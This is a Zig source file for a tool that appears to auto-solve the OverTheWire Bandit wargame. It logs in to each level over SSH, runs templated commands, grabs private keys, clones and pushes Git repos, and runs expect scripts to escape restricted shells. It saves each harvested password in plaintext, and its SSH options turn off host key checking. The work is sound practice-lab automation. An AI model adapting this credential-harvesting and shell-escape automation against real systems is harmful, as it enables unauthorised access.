fn solveBandit26Pair(app: *App, key_file: []const u8) !struct { first: []u8, second: []u8 } {
    const kvs = [_]struct { key: []const u8, value: []const u8 }{
        .{ .key = "BANDIT_HOST_VALUE", .value = app.host },
        .{ .key = "BANDIT_PORT_VALUE", .value = app.port },
        .{ .key = "BANDIT_KEY_VALUE", .value = key_file },
    };
    const output = try runExpectOrErr(app.allocator, SCRIPT_BANDIT26, &kvs);
    defer app.allocator.free(output);
    const pws = try extractPasswords(app.allocator, output);
    defer freePasswords(app.allocator, pws);
    if (pws.len < 2) return error.Bandit26FewerThanTwoPasswords;
    return .{
        .first = try app.allocator.dupe(u8, pws[pws.len - 2]),
        .second = try app.allocator.dupe(u8, pws[pws.len - 1]),
    };
}

fn solveUppercaseShell(app: *App, password: []const u8) ![]u8 {
    const kvs = [_]struct { key: []const u8, value: []const u8 }{
        .{ .key = "BANDIT_HOST_VALUE", .value = app.host },
        .{ .key = "BANDIT_PORT_VALUE", .value = app.port },
        .{ .key = "BANDIT_PASSWORD_VALUE", .value = password },
    };
    const output = try runExpectOrErr(app.allocator, SCRIPT_UPPERCASE, &kvs);
    defer app.allocator.free(output);
    return try extractPasswordOrErr(app.allocator, output);
}

fn writeAskpass(allocator: std.mem.Allocator, dir: []const u8) ![]u8 {
    const askpass = try std.fs.path.join(allocator, &.{ dir, "askpass.sh" });
    var f = try std.fs.cwd().createFile(askpass, .{});
    defer f.close();
    try f.writeAll("#!/usr/bin/env bash\nprintf '%s\\n' \"$BANDIT_GIT_PASSWORD\"\n");
    std.posix.chmod(askpass, 0o700) catch {};
    return askpass;
}

fn gitEnv(allocator: std.mem.Allocator, password: []const u8, askpass: []const u8) !std.process.EnvMap {
    const ssh_cmd = "ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR " ++
        "-o PubkeyAuthentication=no -o PreferredAuthentications=password -o NumberOfPasswordPrompts=1";
    const display = envOr("DISPLAY", ":0");
    var env = try std.process.getEnvMap(allocator);
    errdefer env.deinit();
    try env.put("BANDIT_GIT_PASSWORD", password);
    try env.put("GIT_SSH_COMMAND", ssh_cmd);
    try env.put("SSH_ASKPASS", askpass);
    try env.put("SSH_ASKPASS_REQUIRE", "force");
    try env.put("DISPLAY", display);
    return env;
}

fn mkdtempPath(allocator: std.mem.Allocator, prefix: []const u8) ![]u8 {
    var attempts: u8 = 0;
    while (attempts < 16) : (attempts += 1) {
        var buf: [16]u8 = undefined;
        std.crypto.random.bytes(&buf);
        var hex_buf: [32]u8 = undefined;
        const hex = std.fmt.bufPrint(&hex_buf, "{x}", .{std.fmt.fmtSliceHexLower(&buf)}) catch unreachable;
        const path = try std.fmt.allocPrint(allocator, "/tmp/{s}{s}", .{ prefix, hex });
        std.fs.cwd().makeDir(path) catch |err| switch (err) {
            error.PathAlreadyExists => {
                allocator.free(path);
                continue;
            },
            else => {
                allocator.free(path);
                return err;
            },
        };
        std.posix.chmod(path, 0o700) catch {};
        return path;
    }
    return error.MkdtempFailed;
}

fn gitCloneRepo(app: *App, user: []const u8, password: []const u8, remote_path: []const u8, destination: []const u8) !void {
    const allocator = app.allocator;
    const tmp = try mkdtempPath(allocator, "bandit-git-askpass.");
    defer {
        std.fs.cwd().deleteTree(tmp) catch {};
        allocator.free(tmp);
    }
    const askpass = try writeAskpass(allocator, tmp);
    defer allocator.free(askpass);
    var env = try gitEnv(allocator, password, askpass);
    defer env.deinit();
    const remote = try std.fmt.allocPrint(allocator, "ssh://{s}@{s}:{s}{s}", .{ user, app.host, app.port, remote_path });
    defer allocator.free(remote);
    const argv = [_][]const u8{ "git", "clone", remote, destination };
    const r = try runCommand(allocator, &argv, env, null);
    defer allocator.free(r.output);
    if (r.exit_code != 0) return error.GitCloneFailed;
}

fn gitPushWithPassword(app: *App, password: []const u8, repo: []const u8) ![]u8 {
    const allocator = app.allocator;
    const tmp = try mkdtempPath(allocator, "bandit-git-askpass.");
    defer {
        std.fs.cwd().deleteTree(tmp) catch {};
        allocator.free(tmp);
    }
    const askpass = try writeAskpass(allocator, tmp);
    defer allocator.free(askpass);
    var env = try gitEnv(allocator, password, askpass);
    defer env.deinit();
    const argv = [_][]const u8{ "git", "-C", repo, "push", "origin", "master" };
    const r = try runCommand(allocator, &argv, env, null);
    return r.output;
}

fn solveStep(app: *App, step: *const Table, passwords: *std.AutoHashMap(i64, []const u8)) !void {
    const allocator = app.allocator;
    const step_type = try stepMustString(step, "type");
    const from_level = try stepMustInt(step, "from");
    var from_user_buf: ?[]u8 = null;
    defer if (from_user_buf) |b| allocator.free(b);
    const from_user: []const u8 = blk: {
        if (step.get("user")) |v| {
            if (v.* == .string) break :blk v.string;
        }
        from_user_buf = try std.fmt.allocPrint(allocator, "bandit{d}", .{from_level});
        break :blk from_user_buf.?;
    };
    _ = stepFieldString;
    const from_password_owned = passwords.get(from_level) orelse {
        const m = try std.fmt.allocPrint(allocator, "missing password for bandit{d}", .{from_level});
        die(m);
    };

    if (std.mem.eql(u8, step_type, "ssh_command")) {
        const to_level = try stepIntSingle(step);
        const vars = try stepContextVars(allocator, app, from_level, from_password_owned, to_level);
        defer freeCtxVars(allocator, vars);
        const cmd = try renderTemplate(allocator, try stepMustString(step, "command"), vars);
        defer allocator.free(cmd);
        const pw = try solvePassword(app, from_user, from_password_owned, cmd);
        defer allocator.free(pw);
        try putPassword(passwords, allocator, to_level, pw);
        try recordPassword(app, to_level, pw);
    } else if (std.mem.eql(u8, step_type, "path_then_command")) {
        const to_level = try stepIntSingle(step);
        var vars = try stepContextVars(allocator, app, from_level, from_password_owned, to_level);
        defer freeCtxVars(allocator, vars);
        const find_cmd = try renderTemplate(allocator, try stepMustString(step, "find_command"), vars);
        defer allocator.free(find_cmd);
        const path = try solvePath(app, from_user, from_password_owned, find_cmd);
        defer allocator.free(path);
        var vars2: std.ArrayList(struct { key: []const u8, value: []const u8 }) = .{};
        try vars2.appendSlice(allocator, vars);
        try vars2.append(allocator, .{ .key = "path", .value = try allocator.dupe(u8, path) });
        const vars2_slice = try vars2.toOwnedSlice(allocator);
        defer {
            // Only free the last appended value (path); the rest belong to `vars`.
            allocator.free(vars2_slice[vars2_slice.len - 1].value);
            allocator.free(vars2_slice);
        }
        const cmd = try renderTemplate(allocator, try stepMustString(step, "command"), vars2_slice);
        defer allocator.free(cmd);
        const pw = try solvePassword(app, from_user, from_password_owned, cmd);
        defer allocator.free(pw);
        try putPassword(passwords, allocator, to_level, pw);
        try recordPassword(app, to_level, pw);
    } else if (std.mem.eql(u8, step_type, "private_key_then_ssh")) {
        const to_level = try stepIntSingle(step);
        const vars = try stepContextVars(allocator, app, from_level, from_password_owned, to_level);
        defer freeCtxVars(allocator, vars);
        const key_cmd = try renderTemplate(allocator, try stepMustString(step, "key_command"), vars);
        defer allocator.free(key_cmd);
        const out = try runPasswordSshCommand(app, from_user, from_password_owned, key_cmd);
        defer allocator.free(out);
        const key_file = try savePrivateKey(app, try stepMustString(step, "key_name"), out);
        defer allocator.free(key_file);
        const next_cmd = try renderTemplate(allocator, try stepMustString(step, "next_command"), vars);
        defer allocator.free(next_cmd);
        const key_out = try runKeySshCommand(app, try stepMustString(step, "next_user"), key_file, next_cmd);
        defer allocator.free(key_out);
        const pw = try extractPasswordOrErr(allocator, key_out);
        defer allocator.free(pw);
        try putPassword(passwords, allocator, to_level, pw);
        try recordPassword(app, to_level, pw);
    } else if (std.mem.eql(u8, step_type, "bandit26_escape")) {
        const targets = try stepIntList(allocator, step);
        defer allocator.free(targets);
        const vars = try stepContextVars(allocator, app, from_level, from_password_owned, targets[targets.len - 1]);
        defer freeCtxVars(allocator, vars);
        const key_cmd = try renderTemplate(allocator, try stepMustString(step, "key_command"), vars);
        defer allocator.free(key_cmd);
        const out = try runPasswordSshCommand(app, from_user, from_password_owned, key_cmd);
        defer allocator.free(out);
        const key_file = try savePrivateKey(app, try stepMustString(step, "key_name"), out);
        defer allocator.free(key_file);
        const pair = try solveBandit26Pair(app, key_file);
        defer allocator.free(pair.first);
        defer allocator.free(pair.second);
        if (targets.len != 2) return error.Bandit26EscapeExpectedTwoTargets;
        try putPassword(passwords, allocator, targets[0], pair.first);
        try recordPassword(app, targets[0], pair.first);
        try putPassword(passwords, allocator, targets[1], pair.second);
        try recordPassword(app, targets[1], pair.second);
    } else if (std.mem.eql(u8, step_type, "git_read_file")) {
        const to_level = try stepIntSingle(step);
        const tmp = try mkdtempPath(allocator, "bandit-repo.");
        defer {
            std.fs.cwd().deleteTree(tmp) catch {};
            allocator.free(tmp);
        }
        const repo = try std.fs.path.join(allocator, &.{ tmp, "repo" });
        defer allocator.free(repo);
        try gitCloneRepo(app, try stepMustString(step, "git_user"), from_password_owned, try stepMustString(step, "repo"), repo);
        const file_in_repo = try std.fs.path.join(allocator, &.{ repo, try stepMustString(step, "file") });
        defer allocator.free(file_in_repo);
        const content = try std.fs.cwd().readFileAlloc(allocator, file_in_repo, 1 << 20);
        defer allocator.free(content);
        const pw = try extractPasswordOrErr(allocator, content);
        defer allocator.free(pw);
        try putPassword(passwords, allocator, to_level, pw);
        try recordPassword(app, to_level, pw);
    } else if (std.mem.eql(u8, step_type, "git_show")) {
        const to_level = try stepIntSingle(step);
        const tmp = try mkdtempPath(allocator, "bandit-repo.");
        defer {
            std.fs.cwd().deleteTree(tmp) catch {};
            allocator.free(tmp);
        }
        const repo = try std.fs.path.join(allocator, &.{ tmp, "repo" });
        defer allocator.free(repo);
        try gitCloneRepo(app, try stepMustString(step, "git_user"), from_password_owned, try stepMustString(step, "repo"), repo);
        const argv = [_][]const u8{ "git", "-C", repo, "show", try stepMustString(step, "object") };
        const r = try runCommand(allocator, &argv, null, null);
        defer allocator.free(r.output);
        if (r.exit_code != 0) return error.GitShowFailed;
        const pw = try extractPasswordOrErr(allocator, r.output);
        defer allocator.free(pw);
        try putPassword(passwords, allocator, to_level, pw);
        try recordPassword(app, to_level, pw);
    } else if (std.mem.eql(u8, step_type, "git_push_file")) {
        const to_level = try stepIntSingle(step);
        const tmp = try mkdtempPath(allocator, "bandit-repo.");
        defer {
            std.fs.cwd().deleteTree(tmp) catch {};
            allocator.free(tmp);
        }
        const repo = try std.fs.path.join(allocator, &.{ tmp, "repo" });
        defer allocator.free(repo);
        try gitCloneRepo(app, try stepMustString(step, "git_user"), from_password_owned, try stepMustString(step, "repo"), repo);

        const cfg_email = [_][]const u8{ "git", "-C", repo, "config", "user.email", "bandit-solver@example.invalid" };
        const r1 = try runCommand(allocator, &cfg_email, null, null);
        allocator.free(r1.output);
        if (r1.exit_code != 0) return error.GitConfigFailed;

        const cfg_name = [_][]const u8{ "git", "-C", repo, "config", "user.name", "bandit-solver" };
        const r2 = try runCommand(allocator, &cfg_name, null, null);
        allocator.free(r2.output);
        if (r2.exit_code != 0) return error.GitConfigFailed;

        const file = try stepMustString(step, "file");
        const file_path = try std.fs.path.join(allocator, &.{ repo, file });
        defer allocator.free(file_path);
        var fout = try std.fs.cwd().createFile(file_path, .{});
        defer fout.close();
        try fout.writeAll(try stepMustString(step, "content"));

        const add = [_][]const u8{ "git", "-C", repo, "add", "-f", file };
        const r3 = try runCommand(allocator, &add, null, null);
        allocator.free(r3.output);
        if (r3.exit_code != 0) return error.GitAddFailed;

        const commit_msg = try stepMustString(step, "commit_message");
        const ci = [_][]const u8{ "git", "-C", repo, "commit", "-m", commit_msg };
        const r4 = try runCommand(allocator, &ci, null, null);
        allocator.free(r4.output);
        if (r4.exit_code != 0) return error.GitCommitFailed;

        const push_out = try gitPushWithPassword(app, from_password_owned, repo);
        defer allocator.free(push_out);
        const pw = try extractPasswordOrErr(allocator, push_out);
        defer allocator.free(pw);
        try putPassword(passwords, allocator, to_level, pw);
        try recordPassword(app, to_level, pw);
    } else if (std.mem.eql(u8, step_type, "uppercase_shell")) {
        const to_level = try stepIntSingle(step);
        const pw = try solveUppercaseShell(app, from_password_owned);
        defer allocator.free(pw);
        try putPassword(passwords, allocator, to_level, pw);
        try recordPassword(app, to_level, pw);
    } else {
        return error.UnsupportedStepType;
    }
}

// =============================================================================
// Top-level actions
// =============================================================================

fn refresh(app: *App, doc: *Document) !void {
    try checkDependencies(app.allocator);
    try app.ensureState();

    var stdout_buf: [4096]u8 = undefined;
    var stdout_writer = std.fs.File.stdout().writer(&stdout_buf);
    const w = &stdout_writer.interface;
    try w.print("Refreshing Bandit passwords via {s}:{s}\n", .{ app.host, app.port });
    try w.print("Level config:  {s}\n", .{app.config_path});
    try w.print("Password file: {s}\n", .{app.pass_file});
    try w.print("Key cache:     {s}\n\n", .{app.key_dir});
    try w.flush();

    const boot = doc.root.get("bootstrap").?.table;
    const boot_level = boot.get("level").?.integer;
    const boot_pass = boot.get("password").?.string;

    var passwords = std.AutoHashMap(i64, []const u8).init(app.allocator);
    defer passwordMapDeinit(&passwords, app.allocator);
    try putPassword(&passwords, app.allocator, boot_level, boot_pass);
    try recordPassword(app, boot_level, boot_pass);

    const steps = doc.root.get("steps").?.array;
    for (steps) |item| {
        try solveStep(app, item.table, &passwords);
    }

    try w.print("\nRefresh complete.\n", .{});
    try w.flush();
}

fn showPasswords(app: *App) !void {
    try app.ensureState();
    var stdout_buf: [4096]u8 = undefined;
    var stdout_writer = std.fs.File.stdout().writer(&stdout_buf);
    const w = &stdout_writer.interface;
    const data = std.fs.cwd().readFileAlloc(app.allocator, app.pass_file, 1 << 20) catch |err| switch (err) {
        error.FileNotFound => "",
        else => return err,
    };
    defer if (data.len != 0) app.allocator.free(data);
    if (data.len == 0) {
        try w.print("No passwords saved yet.\n", .{});
    } else {
        try w.print("{s}", .{data});
    }
    try w.flush();
}

fn sshLevel(app: *App, level: i64) !void {
    try app.ensureState();
    const user = try std.fmt.allocPrint(app.allocator, "bandit{d}", .{level});
    defer app.allocator.free(user);
    const password = try getSavedPassword(app, user);
    defer app.allocator.free(password);

    if (password.len == 0) {
        const target = try std.fmt.allocPrint(app.allocator, "{s}@{s}", .{ user, app.host });
        defer app.allocator.free(target);
        var child = std.process.Child.init(&.{ "ssh", target, "-p", app.port }, app.allocator);
        _ = try child.spawnAndWait();
        return;
    }

    var tmpl_buf: [256]u8 = undefined;
    const tmpl = try std.fmt.bufPrint(&tmpl_buf, "/tmp/bandit-ssh.{d}.exp", .{std.os.linux.getpid()});
    var f = try std.fs.cwd().createFile(tmpl, .{});
    try f.writeAll(SCRIPT_INTERACTIVE);
    f.close();
    defer std.fs.cwd().deleteFile(tmpl) catch {};

    var env = try std.process.getEnvMap(app.allocator);
    defer env.deinit();
    try env.put("BANDIT_HOST_VALUE", app.host);
    try env.put("BANDIT_PORT_VALUE", app.port);
    try env.put("BANDIT_USER_VALUE", user);
    try env.put("BANDIT_PASSWORD_VALUE", password);

    var child = std.process.Child.init(&.{ "expect", "-f", tmpl }, app.allocator);
    child.env_map = &env;
    _ = try child.spawnAndWait();
}

fn savePasswordInteractive(app: *App) !void {
    var stdout_buf: [256]u8 = undefined;
    var stdout_writer = std.fs.File.stdout().writer(&stdout_buf);
    const w = &stdout_writer.interface;
    try w.print("Save password for which user? Example: bandit6: ", .{});
    try w.flush();
    var stdin_buf: [256]u8 = undefined;
    var stdin_reader = std.fs.File.stdin().reader(&stdin_buf);
    const r = &stdin_reader.interface;
    const user = try readTrimmedLine(r, app.allocator);
    defer app.allocator.free(user);
    try w.print("Password: ", .{});
    try w.flush();
    const pw = try readTrimmedLine(r, app.allocator);
    defer app.allocator.free(pw);
    try savePassword(app, user, pw);
    try w.print("Saved password for {s}.\n", .{user});
    try w.flush();
}

fn readTrimmedLine(reader: anytype, allocator: std.mem.Allocator) ![]u8 {
    var line: std.ArrayList(u8) = .{};
    while (true) {
        const byte = reader.takeByte() catch |err| switch (err) {
            error.EndOfStream => break,
            else => return err,
        };
        if (byte == '\n') break;
        try line.append(allocator, byte);
    }
    var out = try line.toOwnedSlice(allocator);
    // trim trailing \r
    if (out.len > 0 and out[out.len - 1] == '\r') out = out[0 .. out.len - 1];
    return out;
}

fn menu(app: *App, doc: *Document) !void {
    try app.ensureState();
    var stdout_buf: [256]u8 = undefined;
    var stdout_writer = std.fs.File.stdout().writer(&stdout_buf);
    const w = &stdout_writer.interface;
    var stdin_buf: [256]u8 = undefined;
    var stdin_reader = std.fs.File.stdin().reader(&stdin_buf);
    const r = &stdin_reader.interface;

    while (true) {
        try w.print("====================================\n", .{});
        try w.print("        OverTheWire Bandit App\n", .{});
        try w.print("====================================\n\n", .{});
        try w.print("Password file: {s}\n", .{app.pass_file});
        try w.print("Key cache:     {s}\n\n", .{app.key_dir});
        try w.print("1) SSH into a Bandit level\n", .{});
        try w.print("2) Refresh all passwords\n", .{});
        try w.print("3) Save/update a password\n", .{});
        try w.print("4) Show saved passwords\n", .{});
        try w.print("5) Exit\n\n", .{});
        try w.print("Choose an option: ", .{});
        try w.flush();

        const choice = try readTrimmedLine(r, app.allocator);
        defer app.allocator.free(choice);
        if (std.mem.eql(u8, choice, "1")) {
            try w.print("Bandit level number, e.g. 0, 1, 26, 33: ", .{});
            try w.flush();
            const lvl_str = try readTrimmedLine(r, app.allocator);
            defer app.allocator.free(lvl_str);
            const lvl = std.fmt.parseInt(i64, lvl_str, 10) catch continue;
            try sshLevel(app, lvl);
        } else if (std.mem.eql(u8, choice, "2")) {
            try refresh(app, doc);
            try w.print("Press Enter to continue...", .{});
            try w.flush();
            const tmp_line = try readTrimmedLine(r, app.allocator);
            app.allocator.free(tmp_line);
        } else if (std.mem.eql(u8, choice, "3")) {
            try savePasswordInteractive(app);
        } else if (std.mem.eql(u8, choice, "4")) {
            try showPasswords(app);
            try w.print("Press Enter to continue...", .{});
            try w.flush();
            const tmp_line = try readTrimmedLine(r, app.allocator);
            app.allocator.free(tmp_line);
        } else if (std.mem.eql(u8, choice, "5")) {
            return;
        } else {
            try w.print("Invalid option.\n", .{});
            try w.flush();
        }
    }
}

// =============================================================================
// Main + arg parsing
// =============================================================================

pub fn main() !void {
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();

    const repo_root = try findRepoRoot(allocator);
    defer allocator.free(repo_root);
    const default_config = try std.fs.path.join(allocator, &.{ repo_root, "levels", "bandit-levels.toml" });
    defer allocator.free(default_config);
    var config_path: []u8 = try allocator.dupe(u8, envOr("BANDIT_LEVELS_FILE", default_config));
    defer allocator.free(config_path);
    const pass_file = try std.fs.path.join(allocator, &.{ repo_root, "bandit-passwords.txt" });
    defer allocator.free(pass_file);
    const key_dir = try std.fs.path.join(allocator, &.{ repo_root, ".bandit-keys" });
    defer allocator.free(key_dir);

    var do_refresh = false;
    var do_show = false;
    var ssh_lvl: i64 = -1;

    const args = try std.process.argsAlloc(allocator);
    defer std.process.argsFree(allocator, args);
    var i: usize = 1;
    while (i < args.len) : (i += 1) {
        const a = args[i];
        if (std.mem.eql(u8, a, "--config")) {
            i += 1;
            if (i >= args.len) die("--config requires a path");
            allocator.free(config_path);
            config_path = try allocator.dupe(u8, args[i]);
        } else if (std.mem.eql(u8, a, "--refresh")) {
            do_refresh = true;
        } else if (std.mem.eql(u8, a, "--show")) {
            do_show = true;
        } else if (std.mem.eql(u8, a, "--ssh")) {
            i += 1;
            if (i >= args.len) die("--ssh requires a level");
            ssh_lvl = std.fmt.parseInt(i64, args[i], 10) catch {
                die("invalid level");
            };
        } else {
            const msg = try std.fmt.allocPrint(allocator, "unknown flag: {s}", .{a});
            die(msg);
        }
    }

    const text = try std.fs.cwd().readFileAlloc(allocator, config_path, 1 << 20);
    defer allocator.free(text);

    var doc = try parseToml(allocator, text);
    defer doc.deinit();
    try validateConfig(&doc.root);

    var host: []const u8 = envOr("BANDIT_HOST", "");
    if (host.len == 0) {
        if (doc.root.get("connection")) |conn| {
            if (conn.* == .table) {
                if (conn.table.get("host")) |h| {
                    if (h.* == .string) host = h.string;
                }
            }
        }
    }
    if (host.len == 0) host = DEFAULT_HOST;

    var port: []const u8 = envOr("BANDIT_PORT", "");
    var port_buf: ?[]u8 = null;
    defer if (port_buf) |b| allocator.free(b);
    if (port.len == 0) {
        if (doc.root.get("connection")) |conn| {
            if (conn.* == .table) {
                if (conn.table.get("port")) |p| {
                    if (p.* == .integer) {
                        port_buf = try std.fmt.allocPrint(allocator, "{d}", .{p.integer});
                        port = port_buf.?;
                    }
                }
            }
        }
    }
    if (port.len == 0) port = DEFAULT_PORT;

    var seed: u64 = undefined;
    std.crypto.random.bytes(std.mem.asBytes(&seed));
    var app = App{
        .allocator = allocator,
        .host = host,
        .port = port,
        .repo_root = repo_root,
        .config_path = config_path,
        .pass_file = pass_file,
        .key_dir = key_dir,
        .rng = std.Random.DefaultPrng.init(seed),
    };

    if (do_refresh) {
        try refresh(&app, &doc);
    } else if (do_show) {
        try showPasswords(&app);
    } else if (ssh_lvl >= 0) {
        try sshLevel(&app, ssh_lvl);
    } else {
        try menu(&app, &doc);
    }
}

// =============================================================================
// Tests
// =============================================================================

test "strip terminal codes and CR" {
    const allocator = std.testing.allocator;
    const dirty = "hello\x1b[31mred\x1b[0m\rworld";
    const cleaned = try stripTerminalCodes(allocator, dirty);
    defer allocator.free(cleaned);
    try std.testing.expectEqualStrings("helloredworld", cleaned);
}

test "extract password returns last 32-char alphanumeric" {
    const allocator = std.testing.allocator;
    const text = "noise abcdefghijklmnopqrstuvwxyz012345 then ABCDEFGHIJKLMNOPQRSTUVWXYZ012345 tail";
    const pw = try extractPasswordOrErr(allocator, text);
    defer allocator.free(pw);
    try std.testing.expectEqualStrings("ABCDEFGHIJKLMNOPQRSTUVWXYZ012345", pw);
    const all = try extractPasswords(allocator, text);
    defer {
        for (all) |p| allocator.free(p);
        allocator.free(all);
    }
    try std.testing.expectEqual(@as(usize, 2), all.len);
}

test "render template replaces placeholders" {
    const allocator = std.testing.allocator;
    const vars = [_]struct { key: []const u8, value: []const u8 }{
        .{ .key = "level", .value = "7" },
        .{ .key = "password", .value = "abc" },
    };
    const out = try renderTemplate(allocator, "level={level} pass={password} {password}", &vars);
    defer allocator.free(out);
    try std.testing.expectEqualStrings("level=7 pass=abc abc", out);
}

test "load shared config parity" {
    const allocator = std.testing.allocator;
    const root = try findRepoRoot(allocator);
    defer allocator.free(root);
    const config_path = try std.fs.path.join(allocator, &.{ root, "levels", "bandit-levels.toml" });
    defer allocator.free(config_path);
    const text = try std.fs.cwd().readFileAlloc(allocator, config_path, 1 << 20);
    defer allocator.free(text);
    var doc = try parseToml(allocator, text);
    defer doc.deinit();
    try validateConfig(&doc.root);

    const conn = doc.root.get("connection").?.table;
    try std.testing.expectEqualStrings("bandit.labs.overthewire.org", conn.get("host").?.string);
    try std.testing.expectEqual(@as(i64, 2220), conn.get("port").?.integer);

    const boot = doc.root.get("bootstrap").?.table;
    try std.testing.expectEqual(@as(i64, 0), boot.get("level").?.integer);
    try std.testing.expectEqualStrings("bandit0", boot.get("password").?.string);

    const steps = doc.root.get("steps").?.array;
    try std.testing.expectEqual(@as(usize, 32), steps.len);

    const bandit26 = steps[25].table;
    try std.testing.expectEqualStrings("bandit26_escape", bandit26.get("type").?.string);
    const targets = bandit26.get("to").?.array;
    try std.testing.expectEqual(@as(usize, 2), targets.len);
    try std.testing.expectEqual(@as(i64, 26), targets[0].integer);
    try std.testing.expectEqual(@as(i64, 27), targets[1].integer);
}
